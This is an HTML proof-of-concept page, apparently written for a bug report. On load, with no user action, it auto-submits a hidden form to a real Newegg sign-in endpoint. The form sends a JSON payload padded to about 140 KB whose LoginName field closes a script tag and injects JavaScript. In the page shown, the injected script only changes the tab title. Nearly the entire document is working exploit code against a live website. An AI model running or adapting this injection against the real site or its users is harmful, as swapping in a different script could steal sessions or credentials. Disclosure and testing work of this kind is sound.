<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
  
<title>Newegg F-5 zero-click proof</title>
</head>
<body>
<p>Submitting the padded Payload form to the Newegg sign-in host. On success the tab title becomes <code>zqX</code>.</p>
<form id="f" method="POST" action="https://secure.newegg.com/login/appFaceIDLadingPage" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="Payload" id="payload">
</form>
<script>
  var injected = "</" + "script><script>window.zqX=1;document.title=`zqX`;//";
  var payload = JSON.stringify({
    zqPad: new Array(140 * 1024 + 1).join("A"),
    userState: JSON.stringify({ APPType: "android" }),
    iOSFaceIdLoginInfo: {
      isIOSFaceIdLoginSuccess: true,
      Result: "Success",
      LoginID: 1,
      LoginToken: "zqTok",
      LoginName: injected
    }
  });
  document.getElementById("payload").value = payload;
  document.getElementById("f").submit();
</script>
</body>
</html>
